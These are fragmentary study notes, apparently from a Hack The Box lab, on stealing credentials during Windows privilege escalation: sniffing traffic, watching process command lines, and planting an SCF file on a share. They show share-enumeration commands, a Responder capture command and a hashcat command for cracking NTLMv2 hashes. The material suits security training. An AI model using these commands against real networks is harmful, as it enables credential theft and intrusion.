...
users are usually the weakest link and when theyre overworked and tired ofcourse they wont notice when something changed or when something is off.

- wireshark
	- we can use wireshark to sniff passwords and credentials
- Process Command Lines
	- Monitoring for process command lines
		- after getting a shell as a user, there may be schedualed tsaks being executed which pass creds in the CLI. we can check the CLI every 2 seconds and compare the current state with the previous one to find these
	- Running monitor script on target host
		- procmon.ps1 lol
- SCF on a file share
	- SCF is used by explorer to move up and down directories, it can be manipulated to have the icon file location point to a specific UNC path and have explorer opens the share the SCF file gets run
	- with responder this can be use d

```powershell
// -------------------------- Wireshark -------------------------- //

// Traffic Capture
using wireshark we can usually capture clear text credentials to sniff passwords  and hashes
...
Generally searching for vulnerable services and their CVE's



// -------------------------- SCF on a File Share -------------------------- //

// For finding shares using CMD
net share

// Finding shares using powershell
Get-SmbShare

// Checking permissions of said shares using CMD
net share SHARENAME

// Using icacls to check permissions
icacls "C:\Shares\"

// Using powershell which is much more consistent
Get-ChildItem -Path "C:\shares" -Recurse -Force | ForEach-Object { Get-Acl $_.FullName }
...
```shell-session
Hillside_1@htb[/htb]$ sudo responder -wrf -v -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
...
```shell-session
Hillside_1@htb[/htb]$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
